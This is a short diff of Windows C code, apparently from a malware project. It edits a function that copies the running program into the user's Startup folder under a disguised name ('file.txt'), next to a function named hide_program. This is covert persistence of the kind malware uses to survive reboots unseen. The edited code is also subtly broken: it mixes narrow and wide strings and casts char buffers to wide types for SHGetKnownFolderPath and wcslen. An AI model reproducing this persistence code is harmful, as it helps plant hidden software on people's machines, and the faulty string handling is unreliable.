@@ -53,14 +53,15 @@ void hide_program() {
 }
 
 void add_program_to_autostart() {
-    char current_path[MAX_PATH] = "file.txt";
-    PWSTR target_path = L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\file.txt";
+    char current_path[MAX_PATH] = "";
+    char target_path[MAX_PATH] = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\file.txt";
 
-    PWSTR appdata_folder = NULL;
+    char appdata_folder[MAX_PATH] = "";
 
+    GetModuleFileName(NULL, current_path, MAX_PATH);
     SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &appdata_folder);
-    unsigned int l = wcslen(appdata_folder);
-    wcscpy_s(&appdata_folder[l], MAX_PATH, target_path);
+    unsigned int l = wcslen((const unsigned short *) appdata_folder);
+    strcpy_s(&appdata_folder[l], MAX_PATH, (const char *) target_path);
 
 
     CopyFile(current_path, (LPCSTR) appdata_folder, 0);
